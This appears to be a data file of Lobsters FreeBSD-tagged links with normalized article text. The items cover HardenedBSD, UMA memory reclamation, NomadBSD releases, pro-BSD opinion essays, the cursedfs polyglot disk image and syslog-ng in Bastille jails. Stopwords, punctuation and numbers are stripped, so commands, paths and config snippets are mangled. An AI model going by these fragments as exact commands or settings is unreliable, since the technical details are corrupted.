172,Lobsters,freebsd,FreeBSD,The Idealistic Future of HardenedBSD,https://hardenedbsd.org/article/shawn-webb/2020-01-26/idealistic-future-hardenedbsd,idealistic future hardenedbsd,status report,last status report stood git server since migrated entire infrastructure point selfhosted git sourceoftruth repo past month purchased deployed new package building server published first production package build using server rebuilt old package building server act package building server post signifies important milestone fully recovered last year death infrastructure repo previously outofdate many month fully uptodate four build server total nightly build server nightly build server package building server package building server two major improvement make deploy kerberos ldap across infrastructure four server others along number jail unifying authentication would drastically simplify management set various tor onion service endpoint various part infrastructure distribute onion service hostnames various stake holder notion public endpoint versus private hardenedbsd unique position provide innovative solution atrisk underprivileged population making human right endeavor defining area focus infrastructure integrate various privacy anonymity enhancing technology technique protect life operating system security posture increase especially focus exploit mitigation navigating intersection human right information security directly impact life hardenedbsd mission focus deliver entire hardened ecosystem unfriendly towards would oppress censor people includes subtle shift priority match new mission focus implement exploit mitigation harden ecosystem seek opportunity contribute tangible unique impact human right issue providing tor onion service core infrastructure first step likely many come towards securely helping need grateful opportunity serve let u welcome rebuilt infrastructure renewed purpose
173,Lobsters,freebsd,FreeBSD,New Safe Memory Reclamation feature in UMA,https://lists.freebsd.org/pipermail/freebsd-arch/2020-January/019866.html,new safe memory reclamation feature uma,new safe memory reclamation feature uma jroberson jrobersonnet http information freebsdarch mailing list,new safe memory reclamation feature uma jeff roberson jroberson jrobersonnet sat jan utc hello folk want make larger community aware substantial feature coming uma soon review http along perf result smr technique allows various type lockless synchronization eliminating useafterfree hazard family rcuqsbrepochparsec quite lot material available us algorithm algorithm suffer holding freed memory relatively long period time reclaiming cachecold also creates quite lot resource starvation edge case evident amount code rcu linux intended work around issue algorithm generally best small writefree workload heavy read workload virtual memory system needed something could sustain relatively rapid free ended scheme integrates allocator us novel epochversion tracking mechanism pair give faster performance memory overhead existing epoch implementation obviously contrived perf test want imply replaced network epoch uma smr network stack would go faster think may benefit especially thing high turnover like pcbs yet support sleepable section lot technical space lot information review comment code validating weaker memory ordering architecture need write man page would like find snappy name avoid confusion algorithm anyone suggestion open thanks jeff information freebsdarch mailing list
174,Lobsters,freebsd,FreeBSD,NomadBSD,https://nomadbsd.org/,nomadbsd,folding home coronavirus help simple term software available linux mac window folding home biologylinuxfoldingathome manifest file requirement current version erratum development github contributing nomadbsd issue github nomadbsd developer mailing list news change since rtsxkmod sysutilsiichid graphicsintelbacklight graphicsmirage graphicsviewnior http forumnomadbsdorg change since zeroconf nomadbsd available change since unionfsfuse first release candidate nomadbsd available change unionfs unionfsfuse dsbbg updateobmenu first rolling release nomadbsd based freebsd available change nomadbsd erratum available erratum file nomadbsd released change nomadbsd released change since nomadbsd released change since nomadbsd released change since nomadbsd released change review nomadbsd barnabyh barnabyh allthingslinuxblogspotcom review nomadbsd nomadbsd released change review nomadbsd robonuggie nomadbsd released change nomadbsd bsdnow bsd nomadbsd released change nomadbsd released change,help fighting coronavirus computer running folding home provide computing power help find therapeutic disease please see coronavirus help simple term information software available linux mac window want run folding home freebsd install port biologylinuxfoldingathome nomadbsd persistent live system usb flash drive based together automatic hardware detection setup configured used desktop system work box also used data recovery educational purpose test hardware compatibility list installed software package see manifest file requirement image computer fit usb flash drive system cpu ram able run nomadbsd decently booting possible via bios uefi current version erratum na development check latest code configuration file github contributing nomadbsd would like translate program interface documentation designer programmer check open issue github cool idea project join nomadbsd developer mailing list let u know news pleased present release nomadbsd change since base system upgraded freebsd rtsxkmod driver realtek card reader added zfs layout used installing nomadbsd harddisk changed allow beactl back boot environment thanks maurizioemmex loadiichid added rcscript offer user via dialog menu load experimental iichid driver sysutilsiichid find hid graphicsintelbacklight added curse menu added allows user acknowledge license certain wireless driver order use unionfsmaxfiles rcconf variable added control many file opened unionfs graphicsmirage replaced graphicsviewnior patch added acpivideo module sends devd event whenever brightness changed brightnesslistener added tool listens background devd event keypresses screen brightness button show current brightness level using dunst volumecontrol added wrapper around usrsbinmixer increase decrease toggle mute soundcard display current value dunst spanish translation added nomadbsdadduser thanks hugo salgado bug make brigtness key thinkpad fail fixed bwn module build bwngplphy enabled build nphy support needed device replaced set forum look help give u feedback http forumnomadbsdorg pleased present release nomadbsd change since base system upgraded freebsd automatic network interface setup improved includes better hardware detection support nomadbsd image size exceeded mark flash drive required due bigger image size mailclawsmail replaced mailthunderbird nomadbsd setup lock kernel module package prevent user running problem upgrading package nomadbsdchusr graphical tool modifying user account added nomadbsdsysinfo shell script collect information running system added zeroconf via avahi mdns added czech translation added martin orszulik french translation added reinbold indonesian translation added andreas bayu key binding taking screenshots print locking screen ctrl alt l added theme lock screen added several small tweak bug fix added nomadbsd available pleased present release nomadbsd change since base system changed freebsd due deadlock problem freebsd unionfs replaced unionfsfuse gpt layout changed mbr prevents problem lenovo system refuse boot gpt lenovofix set system hang boot lenovofix set support zfs installation added nomadbsd installer rcscript setting network interface fixed improved support setting country code wlan device added auto configuration running virtualbox added check default display added graphic configuration script fix problem user optimus nvidia card disabled use integrated graphic chip instead nvidia driver version added nomadbsddmconfig qt tool selecting display manager theme setting default user autologin added nomadbsdadduser qt tool added preconfigured user account system added martin orszulik added czech translation setup installation wizard nomadbsd logo designed ian grindley changed support localized error message added support localizing password prompt added template starting de added xinitrc interface nomadbsdsetupgui nomadbsdinstallgui improved script help user configure multihead system added xorg driver newer intel gpus changed intel modesetting proc added etcfstab dbus session issue fixed prevented thunar accessing samba share dsbbg allows user change manage wallpaper added latest version updateobmenu support autoupdating openbox menu manually updating openbox menu packet de installation therefore longer needed support multiple keyboard layout added wwwpalemoon removed mailthunderbird removed audioaudacity added deskutilsorage added password manager replaced keepassxc mailsylpheed replaced mailclawsmail multimediasimplescreenrecorder added dsbmc changed dsbmcqt many small improvement bug fix image instruction found first release candidate nomadbsd available pleased present first release candidate nomadbsd change base system changed freebsd due deadlock problem freebsd unionfs replaced unionfsfuse gpt layout changed mbr prevents problem lenovo system refuse boot gpt lenovofix set system hang boot lenovofix set support zfs installation added nomadbsd installer rcscript setting network interface fixed support setting country code wlan device added auto configuration running virtualbox added check default display added graphic configuration script fix problem user optimus nvidia card disabled use integrated graphic chip instead nvidia driver version added nomadbsddmconfig qt tool selecting display manager theme setting default user autologin added nomadbsdadduser qt tool added preconfigured user account system added martin orszulik added czech translation setup installation wizard nomadbsd logo designed ian grindley changed support localized error message added support localizing password prompt added template starting de added xinitrc interface nomadbsdsetupgui nomadbsdinstallgui improved script help user configure multihead system added xorg driver newer intel gpus changed intel modesetting dsbbg allows user change manage wallpaper added latest version updateobmenu support autoupdating openbox menu manually updating openbox menu packet de installation therefore longer needed support multiple keyboard layout added wwwpalemoon removed mailthunderbird removed audioaudacity added deskutilsorage added password manager replaced keepassxc many small improvement bug fix image instruction found first rolling release nomadbsd based freebsd available pleased present first rolling release nomadbsd based freebsd change rcscript setting network interface fixed support setting country code wlan device added support zfs added nomadbsd installer gpt layout changed mbr layout used freebsd memstick image prevents problem lenovo system refuse boot gpt lenovofix set system hang boot lenovofix set support multiple keyboard layout added autoconfiguration running virtualbox added xorg driver newer intel gpus changed intel modesetting check default display added graphic configuration script fix problem user optimus nvidia card disabled use integrated graphic chip instead latest version updateobmenu support autoupdating openbox menu manually updating openbox menu packet de installation therefore longer needed support configuring multihead system added template starting de added xinitrc setup wizard installer improved image instruction found nomadbsd erratum available erratum file nomadbsd available nomadbsd released pleased announce release nomadbsd would like thank tester sent u feedback bug report change image instruction found nomadbsd released second release candidate nomadbsd available would like thank tester sent u feedback bug report notice problem please let u know change since base system upgraded freebsd trim enabled default vt color theme added dialog based setup replaced qt gui support dynamic translation currently available translation german russian order reduce number implicit package upgrade possible inconsistency pkg default repository changed quarterly recent copy nomadbsd handbooklet added nomad home dir new option added boot menu allows user set hwsysconsdisable kernel tunable added bootloaderconf prevent mountroot mounting root partition device available dynamic creation configuration file intel gpus added gpus using legacy driver uxa acceleration method used newer gpus sna used fix performance problem least hd graphic broadwell backend compton changed xrender fix input delay problem nvidia driver make using compton vesa scfb possible added started pressing ctrlspace bug nvidia glx library could found path change nvdiadriver package fixed bug executing pkg install delete lead overwriting library path nvidia library fixed dialog menu added initgfx script allows user choose auto detection nonaccelerated graphic driver driver database sysutilsdsbdriverd extended detect network device device id list run iwm firmware module extended record rtwn device added script installing nomadbsd hard disk added support building image added image instruction found nomadbsd released first release candidate nomadbsd available notice problem please let u know change since image instruction found nomadbsd released change since base system upgraded freebsd basic support macbooks added script loading matching drm driver graphicsdrmstablekmod radeon gpus added together recent amd radeon chipsets work box intel gpus new graphicsdrmstablekmod used added fallback driver autodetection virtualbox pseudo gpu added fallback configuration scfb efi booting fixed support modern intel gpus added support installing package added improved setup menu software package benchmarksbonnie dsbdisplaysettings dsbexec dsbsu mailthunderbird netmosh portsmgmtoctopkg printqpdfview securitynmap sysutilsddrescue sysutilsfusefshfsfuse sysutilsfusefssshfs sysutilssleuthkit wwwlynx many improvement bugfixes image instruction found nomadbsd released second release candidate available change script loading matching drm driver graphicsdrmstablekmod radeon gpus added together recent amd radeon chipsets work box intel gpus new graphicsdrmstablekmod used added fallback driver image instruction found review nomadbsd barnabyh barnabyh allthingslinuxblogspotcom wrote review nomadbsd thank nomadbsd released first hopefully final release candidate nomadbsd available change base system upgraded freebsd efi booting fixed support modern intel gpus added support installing package added improved setup menu software package benchmarksbonnie dsbdisplaysettings dsbexec dsbsu mailthunderbird netmosh portsmgmtoctopkg printqpdfview securitynmap sysutilsddrescue sysutilsfusefshfsfuse sysutilsfusefssshfs sysutilssleuthkit wwwlynx many improvement bugfixes image instruction found review nomadbsd robonuggie made review nomadbsd find video thank nomadbsd released change fix problem graphic driver detection fix boot problem disable terminal bell add rc script automatically load correct acpi module closelock root shell ttyv nomadbsd bsdnow nomadbsd mentioned bsd thank guy nomadbsd released change setup process improved support optional geli encryption home partition added autodetection nvidia graphic card corresponding driver added thanks holgerw lme bsdforende rc script start geom disk scheduler root device added software added accessibilityredshift start automatically audiocantata audiomusicpd audioncmpc ftpfilezilla gamesbsdtris mailneomutt mathgalculator sysutilsbsdstats several smaller improvement bugfixes nomadbsd released change partition scheme changed mbr gptefi graphical boot loader oliver fromme installed filesystem setting changed better performance growing filesystem fill flash drive automatically done setup menu boot time reduced problem setup system nvidia graphic card installed fixed browser configuration changedincluded improve performance
175,Lobsters,freebsd,FreeBSD,FreeBSD is an amazing operating system,https://www.unixsheikh.com/articles/freebsd-is-an-amazing-operating-system.html,freebsd amazing operating system,freebsd amazing operating system update hacker news reddit lobster complete freebsd update update wiki update changing since still done update update ufs zfs geom geli update freebsd advocacy project port system pkg jail system update bastille update update update voting irc channel freebsd mailing list freebsd forum absolute freebsd allan jude freebsd mastery zfs freebsd mastery advanced zfs patreon relevant link,freebsd amazing operating systemposted last updated small article adventure freebsd believe amazing operating system update since wrote article got posted hacker news reddit lobster people emailed comment updated article comment found suitable side note want point freebsd developer may thing going freebsd world know absolutely nothing also glued freebsd developer mailing list freebsd fanboy using gnulinux ton past two decade freebsd mainly due hardware incompatibility lacking buggy driver love debian gnulinux arch linux much freebsd however concerned current development gnulinux land late also article trying make anyone switch something else freebsd like freebsd recommend try messing operating system think year late mid one day browsing computer book favorite bookshop discovered book complete freebsd third edition greg lehey book came cd rom freebsd already familiarized gnulinux process migrating every server desktop operating system away microsoft window home company gnulinux initially red hat linux later debian gnulinux eventually became favorite gnulinux distribution many year first saw complete freebsd book greg lehey remember noticing text front page said free version berkeley unix rock solid stability immediately intrigued free unix operating system rock solid stability sounded amazing immediately bought book became favorite reading material long time even nt anything unix related surprised never heard freebsd since existed since least another unix like operating system would nt completely foreign experience gnulinux nt test installs different hardware loved freebsd right away freebsd became first ftp server run home later employed one biggest isps country discovered surprise entire server network structure run freebsd computer nt run freebsd computer office sale people secretary worked ran microsoft window asked choice operating system system administrator said something like people know run freebsd everyone communication industry run freebsd eventually got experience freebsd rock solid stability mentioned greg leheys book first hand freebsd amazing performant extremely stable every single customer hosted isp lot customer served freebsd running everything old pc latest pentium machine time freebsd needed rebooted upgraded base system time never experienced problem anywhere freebsd running contrary freebsd gnulinux viewed upon toy operating system used support staff private setup failed realize back freebsd still designed complete multipurpose operating system meant setup tuned according specific use case occasionally installed freebsd nt always perform well default debian gnulinux installation task even freebsd ftp server home eventually got replaced debian gnulinux freebsd rebooted every third day otherwise performance degraded lot debian hand performed without hickups update people asking specific problem freebsd remember detail exactly think something freebsd server running memory sure also nt try solve problem busy replaced freebsd debian also long time ago course kind bug highly suspect ftp server software running even related freebsd update someone commented hacker news following statement imo need manually tuned bug feature speaking freebsd developer disagree completely many option simply auto tune use case different need able set specific option need manually big difference running busy static fileserver something like nginx top freebsd running busy database server freebsd setup may require specific tuning use case whether filesystem kernel something else later year come gnulinux also got better hardware support often wanted install freebsd stupid hardware nt work hardware expensive back nt option purchase hardware knew would work freebsd issue eventually made use gnulinux lot freebsd today longer big problem freebsd great support modern hardware gpu support good linux freebsd wiki provides relevant information still liked freebsd much eventually ended using freebsd main desktop computer long time also still running several gnulinux distribution computer thing love freebsd freebsd complete operating system freebsd well thought well designed get understand freebsd setup work surprising many detail developer thought freebsd set kernel base system apart third party package unique freebsd none bsds update made mistake wrote bsds meant unique bsd something find gnulinux distribution always loved freebsd unfortunately humble opinion changing since work still done slowly getting personally wish nt change third party application installed usrlocal third party application setting installed usrlocaletc combined separation base system third party application make trivial manage third party application need change setup simply delete installed package pkg delete start installing one want freebsd installed feature enable either installation manually nothing running nt know freebsd also optin meaning enable something order run work update course basic service running default like cron part basic operating system maintenance tool cron basic log rotation needed freebsd code meticulously maintained well documented update someone disputed perhaps requires investigation generally thinking gnulinux comparison freebsd ufs zfs filesystems base install freebsd come rich storage system geom allows use two networked machine highavailability storage use choice raid level add feature like compression encryption freebsd also geli block devicelayer disk encryption system us geom disk framework freebsd service handling simple service whether part base system installed port come script responsible starting stopping often option default script reside default directory default setting like etcdefaultrcconf setting overwritten using etcrcconf want enable sshd add sshdenable yes etcrcconf sshd enabled boot use command service sshd enable even easier freebsd rc system read configuration file understands dependency service automatically launch parallel wait one finished starting thing need get benefit modern configuration system without complex interface update someone stated parallelism part true never used option described way freebsd advocacy project literally say rc system read file understands dependency service automatically launch parallel wrong website need bug report freebsd port system pkg freebsd amazing jail system allows run application entire system sandbox access rest system long docker even though freebsd jail update freebsd also bastille container management framework installable port package system freebsd mandatory access control trustedbsd project allows configure access control policy operating system resource freebsd capsicum allows developer implement privilege separation reducing impact compromised code freebsd also vuxml system publishing vulnerability port integrates tool pkg daily security email tell known vulnerability ported software freebsd security event auditing using bsm standard mentioned previously freebsd real multipurpose operating system many different use case freebsd flexible tuneable whether want run freebsd desktop computer server provides many tuneable option enables make performant option set outofthe box may suit need exactly freebsd provides lot documentation get work need provides helpful community many people experience dealing many different situation problem believe important understand freebsd like gnulinux distribution freebsd operating system made developer also system administrator update least used like perhaps today lesser degree mean freebsd supposed run system administrator understands system work simply jump something like ubuntu fedora opensuse expect get experience freebsd lot people would extremely sad case linux distribution collection tool written different group people often conflicting interest priority linux distribution need linux kernel gnu tool library perhaps additional third party software documentation x window system window manager desktop environment need combine different component resulting distribution different distribution focus different goal put focus desktop others put main focus server others try provide multipurpose operating system like ubuntu freebsd like freebsd complete operating system produced team people passionate work conflicting interest project people maintain kernel also people maintain c library l stat command different tool freebsd also provides full documentation everything related operating system update freebsd used desktop operating system need third party software x window system window manager desktop environment point freebsd collection tool written different group people often conflicting interest priority like linux kernel gnu c library etc update someone pointed exist conflicting interest freebsd project well example spring mind perhaps conflict matthew dillon eventually forked freebsd dragonflybsd disagreed freebsd developer performance issue original statement perhaps misunderstood nt think issue like bsd conflict completely different project like linux kernel gnu c library serious conflict linux land could result nonfunctional operating system happen bsd project structure project freebsd dispute settled core team voting openbsd theo de raadt project leader final say someone disagrees either eventually accepts final decision freedom fork project like matthew ended like theo de raadt ended netbsd different going gnulinux meant express whether gnulinux user distro hopping time gnulinux user already found favorite gnulinux distribution perhaps even microsoft window user macos user case highly recommend try freebsd spend real quality time studying freebsd documentation get system understand something work reach people irc channel freebsd mailing list freebsd forum find many helpful people also highly recommend book absolute freebsd michael w lucas networksecurity engineer lot experience working highavailability system freebsd michael book get lot detail freebsd operating system well written contains many relevant detail michael w lucas together allan jude also written freebsd mastery zfs freebsd mastery advanced zfs book interested zfs filesystem running freebsd second book followup first book advance use case book invaluable freebsd amazing operating system comment correction please feel free email also found content useful consider supporting patreon relevant link
176,Lobsters,freebsd,FreeBSD,why you should migrate everything from linux to bsd,https://www.unixsheikh.com/articles/why-you-should-migrate-everything-from-linux-to-bsd.html,migrate everything linux bsd,migrate everything linux bsd table content introduction microsoft window apple macos google android typical discussion bsd v linux init solution systemd linux fragmented realworldtechcom openzfs openzfs linux tfir open source emerging tech youtube channel chrome o linux scratch linux maintains bug real reason ifconfig linux deprecated linux hijacked real motivation behind systemd interview controversial company linus tech tip please note nt use private internet access dns http bad enough highly criticized disabled dns http bsd sane people berkeley software distribution bsd freebsd openbsd netbsd dragonfly bsd linux kernel gnu tool library init system use contribute bsd disabling dns http openbsd license problem open source antipattern dtrace zfs gnome mailing list tmux project time migrate everything bsd forcing adaption drm freebsd amazing operating system openbsd fantastic patreon relevant link,migrate everything linux bsdposted last updated operating system gnulinux become mess fragmented nature project bloatware kernel jerking around commercial intereststhere exist several technical reason migration gnulinux bsd might make sense article nt opinionated rant anything else table content introduction past always favorite choosing operating system tool based upon technical merit however today world company like microsoft apple google many others compromising user privacy conducting controversial activity nt believe right cause action proprietary operating system like microsoft window apple macos google android become famous ill conduct even company like lenovo using uefi boot inject custom window component system phone home lenovo result proponent open source alternative like gnulinux bsd long time also believe open source alternative much better many technical area also always much typical discussion bsd v linux wrote article back always believed different open source project help cooperate kindness endusers debate issue technical stand point rather personal preference whenever possible proposed people private industry change operating system use open source alternative people receptive advocacy helped migrate microsoft window workstation something like linux mint xubuntu debian gnulinux server side used bsd gnulinux successful endeavor honestly never experienced dissatisfied person however thing beginning change gnulinux world company want control direction project due structure organization gnulinux operating system unfortunately susceptible influence still open source still anywhere near bad thing going proprietary alternative optout feature slowly introduced kernel systemd still choose optout feature go merry way open source enthusiast proponent privacy concerned individual perhaps better approach migrate system something nt concern creepware system administrator nt want worry whether going surprised next time upgrade system nt want keep list thing remember optout whenever run one system several linux distribution decided privacy optout issue issue well implement init solution systemd situation going kernel development many third party application becoming dependent upon systemd problem spreading part system believe becoming uphill battle nt believe future gnulinux look bright used possible alternative solution suggest migrating everything possible something bit sane like bsd project linux fragmented richard stallman announced intent start coding gnu project usenet message june project accumulated developed free open source software assembler almost finished portable optimizing c compiler gcc editor gnu emacs various unix utility l grep awk make ld linux kernel appeared developed outside gnu project linus torvalds december made available version gnu general public license combined operating system utility already developed gnu project became gnulinux operating system better known linux came linux distribution different project took linux kernel gnu tool library additional third party software documentation x window system window manager desktop environment combined component distribution different distribution focused different goal put focus desktop others put main focus server others tried provide multipurpose operating system past different component project developed open source enthusiast passion programming open source driving force longer case linus torvalds many time made clear nt care go linux world care kernel development january moderated discussion forum realworldtechcom linus torvalds answered user question absolute jawdropping comment yearold kernel maintenance controversy heavily impacted zfs linux project answering user actual question torvalds went make wrong damaging claim zfs filesystem torvalds said zfs always buzzword anything else statement linus torvalds reduced year development one robust popular filesystems world buzzword zfs described last word filesystems combined filesystem logical volume manager originally designed sun microsystems zfs stable fast secure futureproof filesystem scalable includes extensive protection data corruption support high storage capacity maximum exabyte file size maximum quadrillion zettabyte storage limit number filesystems datasets file efficient data compression snapshot copyonwrite clone continuous integrity checking automatic repair raidz native acls precisely configured two main implementation oracle openzfs project extremely similar making zfs widely available within unixlike system mentioned wikipedia article openzfs umbrella project aimed bringing together individual company use zfs file system work improvement aiming well making zfs widely used developed opensource manner openzfs brings together developer illumos linux freebsd macos platform wide range company highlevel goal project include raising awareness quality utility availability opensource implementation zfs encouraging open communication ongoing effort toward improving opensource variant zfs ensuring consistent reliability functionality performance distribution zfs openzfs linux linux part project currently active contributor commits commits made almost daily basis world biggest cdn data storage service run zfs either freebsd linux another situation linus torvalds gave interview tfir open source emerging tech youtube channel linux desktop make another amazing statement saying linux still nt ready desktop perhaps chrome o solution problem many statement linus torvalds show torvalds avoid authoritative statement project unfamiliar importantly also show linux operating system real direction clear management kernel development performed isolation rest linux world linus torvalds generally open rapid influence corporate interest perspective security also worrying linus torvalds admitted kernel development getting control getting bloated huge yes problem uh love say plan mean sometimes bit sad definitely streamlined small hyperefficient kernel envisioned year ago kernel huge bloated icache footprint scary mean question whenever add new feature get worse linuxcon said think bloat situation better modern pc lot faster bloating kernel last year hardware grown faster problematic attitude software get bloated becomes insecure error prone also becomes much slower thinking problem go away hardware becomes faster immature attitude day age need optimize software le power required need save power limit pollution interview quit kernel developer con kolivas stated one big problem kernel development linux complete disconnection development process normal user know one constitute linux user base linux kernel mailing list way communicate kernel developer put mildly linux kernel mailing list lkml scary communication forum come people absolutely terrified mailing list lest get flamed inexperience inappropriate bug report stupid whatever think kernel developer large nt got faintest idea big problem userspace besides mentioned problem fact matter linux operating system put together many different application different project nothing nt know anything take look build linux scratch another good read demonstrates problem article linux maintains bug real reason ifconfig linux deprecated different bsds individual project meaning freebsd openbsd netbsd dragonfly bsd independent project put together system inhouse speak kernel standard c library user land tool etc part base system operating system something put together bunch different outside source linux hijacked linux distribution collection tool written different group people often conflicting interest priority fragmented structure gnulinux operating system project whole rapidly spinning control get pushed around commercial interest even best gnulinux distribution debian gnulinux arch linux still driven open source enthusiast immune problem still depend heavily fragmented tool article real motivation behind systemd previously written primary reason developing systemd red hat interest embedded device initially systemd released new init system slowly grown poettering describes suite software provides fundamental building block linux operating system design coincidence interview red ceo jim whitehurst state partner largest embedded vendor world particularly telecom automotive industry stability reliability number one concern easily adapted systemd nothing systemd administration tool contrary really like even like several tool come main problem systemd continued development motivated company economic interest open source community interest adoption systemd major linux distribution debian gnulinux arch linux big mistake humble opinion made heavily dependent upon systemd another heavy influencer linux world google google developed android chrome o linux kernelbased operating system chrome o derived chromium o us google chrome web browser principal user interface chrome o viewed competitor microsoft directly microsoft window indirectly company word processing spreadsheet application latter chrome o reliance cloud computing one core problem chrome o built great reliance google cloud infrastructure google become one controversial company google essence advertisement company become famous manipulation search result extreme user tracking capability mainly thanks stupidity web developer adding google analytics website youtube video august linus tech tip linus sebastian demonstrates tracking internet work affect price get offered search product please note video sponsored private internet access company since bought kape technology known sending malware software really scummy general nt use private internet access cloudflare another american web infrastructure website company affecting development linux company provides service actually sit website visitor cloudflare user hosting provider acting reverse proxy website cloudflare become one greatest cancer internet systemd mozilla managed integrate cloudflare core product systemd integrated cloudflare google dns server optout systemdresolved mozilla defaulting dns http firefox cloudflare even though mozilla firefox nt linux project still one widely used browser different linux distribution mozilla make big mistake integrating dns http firefox let alone using cloudflare setting bad precedence dns http bad enough highly criticized good reason combining controversial company like cloudflare make even worse openbsd disabled dns http default build firefox due use cloudflare service feature hijacked might strong word influence red hat systemd managed steer direction gnulinux operating system direction contradicts many system administrator user would like see bsd sane people let start saying nt mean literally talking design development decision point view system administration coding contrary linux distribution berkeley software distribution bsd fragmented project bsd project maintain entire operating system kernel bsd operating system based research unix developed distributed computer system research group csrg university california berkeley today bsd refers descendant freebsd openbsd netbsd dragonfly bsd project real operating system kernel distribution linux distribution debian gnulinux arch linux work bringing together software required create complete linux operating system need linux kernel gnu tool library init system amount third party application order end functioning operating system contrast mentioned bsds kernel complete operating system example freebsd provides freebsd kernel freebsd operating system maintained single project one person corporation owns bsd created distributed community highly technical committed contributor world company also use contribute bsd contrary linux company hijack bsd company make version bsd sony computer entertainment done playstation playstation playstation vita gaming console bsds complete operating system bsd project maintained developed open source enthusiast company red hat bsd project really truly independent result organization structure nt normally find crazy optout setting basic installation matter bsd project choose nt find privacy compromising solution integrated operating system component contrary project developed driven skillful enthusiastic people care much operating system design security privacy often find even third party software available installation using package manager get patched problem nt exist disabling dns http openbsd mentioned another great benefit community surround bsd project consist experienced helpful part kind people freebsd community especially kind helpful license problem linux gpl license strict developer open source antipattern force release modified source code prevents open source project integrated example preventing integration dtrace zfs linux bsd developer hand restriction manufacturer may opt bsd operating system choice creating new device instead linux would allow keep code modification linux license force release source code public gpl license may sound better allow company simply steal open source code produce closed source product based upon without giving anything back simple forcing company release source code public code may rejected original developer make company manipulative tactic deployed red hat release systemd try get many important third party project cooperate tightly systemd even depend upon systemd way linux distribution easily persuaded adopting systemd easy integration third party project systemd developer addressed several third party project tried convince make project either depend upon systemd attempt made lennart poettering gnome mailing list attempt made red hat developer keszybz tmux project attempt originally disguised technical issue however read long email correspondence gnome mailing list elsewhere real intent becomes quite clear manipulation nt needed bsd company free whatever want bsd nt need try affect way thing going nt case would possible see example sony trying hard influence development freebsd use playstation product different gnulinux distribution debian gnulinux arch linux even red hat linux back day really great project project driven passion profit tend become much better quality something still evident server platform linux bsd always dominated server infrastructure quality provided however project longer driven passion rather profit often decline quality natural motivation profit different motivation passion one reason microsoft window always crappy server desktop operating system reason success microsoft window desktop nt people believe window great operating system sane experienced system administrator supporter belief rather aggressive marketing strategy deployed microsoft bsd project get code occasional financial support company driven passion profit mainly mean well thought decision course mistake made time time compromise privacy security benefit profit find linux time migrate everything bsd back started migrating every server desktop operating system microsoft window home company gnulinux initially red hat linux later debian gnulinux spent year microsoft window support wasted much time absolutely horrible operating system recommended gnulinux good friend mine amazed well performed amazing open source community usual problem related window vanished whenever replaced window setup linux setup customer family member friend support hour rapidly declined course meant le customer support work great could concentrate time important matter little later discovered bsd world eventually also began deploying freebsd openbsd server desktop back day linux often better hardware support bsd result generally used linux bsd hardware expensive always possible purchase hardware based upon operating system wanted run system different today bsds generally great support modern hardware never used netbsd dragonfly bsd project bad simply prefer freebsd openbsd still like debian gnulinux arch linux much nt want worry possibly new privacy problematic setting default installation systemd nt wont worry bloatware go kernel kernel forcing adaption drm nt want worry whatever next problematic thing going operating system linux becoming mess fragmented nature project jerking around commercial interest red hat systemd read freebsd article freebsd amazing operating system openbsd article openbsd fantastic comment correction please feel free email also found content useful consider supporting patreon relevant link
177,Lobsters,freebsd,FreeBSD,Make Disk Image Formatted as ZFS/ext2/FAT All at Once with cursedfs,https://github.com/pcd1193182/cursedfs,make disk image formatted cursedfs,cursedfs got nerdsniped write filesystems note utility faq,cursedfs make disk image formatted zfs fat cursedfs wget http cursedfs sudo mount loop msdos cursedimg mountpoint cursedfs l mountpoint duckrolljpg cursedfs sudo umount mountpoint cursedfs sudo mount loop cursedimg mountpoint cursedfs l mountpoint rickrolljpg cursedfs sudo zpool import cursed cursedfs l cursed got nerdsniped fat us first byte store superblock store metadata starting third byte zfs store metadata starting marker using program creates filesystem mark many block unusable three made overlap metadata allowing live harmony build niedzejkob great work fat filesystems live inside zfs boot block space filesystem life first fat filesystem life next mib write filesystems yes fat reserve sector used zfs label fat reserve space used zfs nt write boot space three exist harmony note need use utility build cursed filesystem since know reserve block creating filesystem faq btrfs ntfs number restriction consider trying add new filesystem first critical metadata need overlap superblock life one sector already using ca nt avoid using sunk second filesystem need way reserve space wo nt write filesystems live basically filesystems reserve space beyond certain point create disk image small size expand filesystem wo nt write beyond think end image ca nt overlay two filesystems without space reservation capability btrfs first metadata kib leaf plenty space start f metadata though zfs two could nt coexist nt know mechanism reserve space later disk filesystems could store data unless wanted share among mount ca nt use btrfs ntfs us first sector superblock compatible fat apfs us first sector superblock compatible fat addition believe superblock larger kib also impinges superblock confused work filesystems know space ca nt use first filesystem created disk image specific size given example fat filesystem created filesystem filesystem result neither try write beyond point main body zfs storage space safe second filesystem created space start superblocks critical metadata marked reserved wo nt write next fat next mib protects zfs label fat filesystem also protects filesystem fat filesystem since life entirely reserved mib fat wo nt try allocate data finally fat filesystem protected zfs writes live entirely reserved boot block first label zfs wo nt try issue writes
178,Lobsters,freebsd,FreeBSD,Running syslog-ng in BastilleBSD,https://www.syslog-ng.com/community/b/blog/posts/running-syslog-ng-in-bastillebsd,running syslogng bastillebsd,podman buildah bastillebsd getting started getting started syslogng bastille testing next http docsbastillebsdorgenlatestchaptersnetworkinghtml using bastillebsd template http gitlabcombastillebsdtemplatessyslogng http gitlabcombastillebsdtemplatessyslogng http githubcomsyslogngsyslogng pczanik,bastille container management system freebsd coming linux world bit like docker podman buildah red hat least functionality learned bastillebsd right christmas holiday currently primary work platform linux preparing learn kubernetes openshift planned anything work related holiday quite difficult hobby heavily overlap work strong freebsd root started use freebsd bastillebsd arrived time good excuse something related getting started begin make sure freebsd installed get started completing getting started guide bastillebsd help upgrade system latest security update set pkg package system install bastillebsd easiest way install using package pkg install bastille testing bastille really necessary enable container automatically boot following command sysrc bastilleenableyes added flexibility security use zfs filesystem testing limited virtual environment rather skipped possibility bastillebsd work fine without come packet filter configuration make sure configure external interface correctly case change firewall configuration ready bootstrapped release container bastille bootstrap update running command system finally ready create container tested bastille command listed getting started guide create start list console stop destroy done setup basic testing ready next step running syslogng bastille syslogng bastille creative come inventing name ip address used example getting started guide creative replace alcatraz better name different ip address first create new container bastille create alcatraz alcatraz name container freebsd release based end command line ip address container run obviously local network running ip address rather pick start new container bastille start alcatraz bit surprise configuration worked container started container started start configuring disable syslogd bastille sysrc alcatraz syslogdenable install syslogng bastille pkg alcatraz install syslogng start syslogng automagically starting container bastille sysrc alcatraz syslogngenable yes edit syslogng configuration container add tcp source listening port disable log path sending log devconsole unavailable container diff change root diff usrlocaletcsyslogngconf usrlocalbastillejailsalcatrazrootusrlocaletcsyslogngconf udp internal udp tcp port internal log source src filter ferr destination console log source src filter fkern filter fwarning destination console log source src filter fauth filter fnotice destination console log source src filter fmail filter fcrit destination console log source src filter ferr destination console log source src filter fkern filter fwarning destination console log source src filter fauth filter fnotice destination console log source src filter fmail filter fcrit destination console finally restart container configuration take effect 